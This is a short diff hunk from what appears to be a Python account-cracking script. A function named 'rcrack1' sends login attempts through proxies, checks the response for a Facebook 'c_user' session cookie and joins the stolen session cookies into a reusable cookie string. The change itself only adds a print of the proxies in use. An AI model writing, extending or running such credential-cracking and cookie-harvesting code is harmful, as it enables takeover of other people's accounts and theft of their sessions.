@@ -268,6 +268,7 @@ def rcrack1(uid,pwx,tl):
             response_text = response.text
             if response.status_code == 200:
               #print(f"\r\033[1;91m [succes] - Status code {response.status_code}")
+              print(f"\x1b[38;5;196m[proxies💔] {proxies}")
               log_cookies=session.cookies.get_dict().keys()
               if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
